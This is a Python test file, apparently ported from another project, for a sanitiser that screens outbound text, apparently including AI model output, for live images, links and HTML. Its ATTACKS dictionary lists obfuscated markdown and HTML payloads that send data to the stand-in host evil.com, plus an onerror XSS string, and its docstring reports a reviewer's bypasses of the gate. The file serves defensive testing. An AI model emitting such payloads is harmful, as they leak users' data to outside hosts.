"""Ported from WARDEN tests/test_gate_render.py (main a1e76cbf, veerarakesh56/warden). Kept 1 tests; dropped 8 that need WARDEN-only modules or unported gate policy (listed in the PR).

The outbound gate judged by a real renderer, not by regex (independent review, 2026-09-28).

The reviewer proved each G3 bypass by rendering the gate's output with a CommonMark parser and
finding a live <img> or link. The same check runs here: whatever the gate lets out must render with
no image, no link and no raw HTML - and the Slack conversion must hold no link or mention syntax."""

from __future__ import annotations

from markdown_it import MarkdownIt

from hadavin_sdk.approvals.gate import sanitise_text

MD = MarkdownIt("commonmark")
ATTACKS = {
    "autolink": "see <http://evil.com/x?d=S>",
    "slack_url_text": "see <http://evil.com|click>",
    "entity_scheme_inline": "[c](h&#116;tps://evil.com/?d=S)",
    "refdef_escaped_label": "[a\\]b]: h&#116;tps://evil&#46;com/?d=S\n\n![x][a\\]b]",
    "refdef_in_list_item": "- [r]: h&#116;tps://evil&#46;com/?d=S\n- ![x][r]",
    "refdef_in_quote": "> [r]: https://evil.com/?d=S\n\n![x][r]",
    "html_entity_img": "&lt;img src=x onerror=alert(1)&gt;",
    "ip_host_scheme": "http://1.2.3.4/x?d=S",
    "mailto_bare": "mailto:x@evil.com?body=S",
    "other_schemes": "ssh://evil.com/ smb://evil.com/share slack://open vscode://x",
    "img_newline_in_dest": "![x](\nhttps://evil.com/?d=S)",
    "link_text_multiline": "[click\nhere](//evil.com/x)",
    "html_split_tag": "<img\nsrc=https://evil.com/x>",
    "html_split_tag_entity": '<img\nsrc="h&#116;tps://evil&#46;com/x">',
    "angle_dest": "[x](<h&#116;tps://evil&#46;com/a b>)",
    "crlf": "ok\r\n![x](https://evil.com/?d=S)",
    "model_hypothesis_ref_image": "![status][r] Memory pressure\n\n- [r]: h&#116;tps://evil&#46;com/p.png?d=db7",
}


def test_a_code_block_is_still_verbatim():
    kept = "```\nGET https://api.example.com/v1/x <img src=x>\n```"
    assert sanitise_text(kept) == kept
